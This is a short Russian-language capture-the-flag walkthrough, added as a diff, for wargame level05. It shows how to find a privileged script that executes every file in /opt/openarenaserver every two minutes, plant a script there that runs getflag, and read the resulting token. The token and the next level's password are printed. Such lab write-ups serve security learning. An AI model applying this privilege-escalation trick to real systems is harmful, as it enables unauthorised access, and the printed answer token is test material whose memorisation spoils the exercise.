@@ -1,0 +1,18 @@
+> find / -user flag05   		(команда вернула нам файл /usr/sbin/openarenaserver)
+> find / -name level05			(команда вернула нам файл /var/mail/level05)
+
+
+> cat /usr/sbin/openarenaserver		(смотрим что в файле openarenaserver)
+> cat /var/mail/level05			(смотрим что в файле level05)
+
+Из скрипта level05 мы видим, что каждые две минуты запускается скрипт openarenaserver под правами пользователя flag05.
+Из скрипта openarenaserver мы видим, что исполняются все файлы в директории /opt/openarenaserver/ и удаляются сразу после исполнения.
+Заходим в директорию /tmp, создаем там скрипт с таким содержимым: getflag > /tmp/res.
+
+> cp script /opt/openarenaserver/ 	(копируем наш скрипт в директорию и ждем 2 минуты)
+
+> cat /tmp/res
+-> Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+> su level06
+Password: viuaaale9huek52boumoomioc
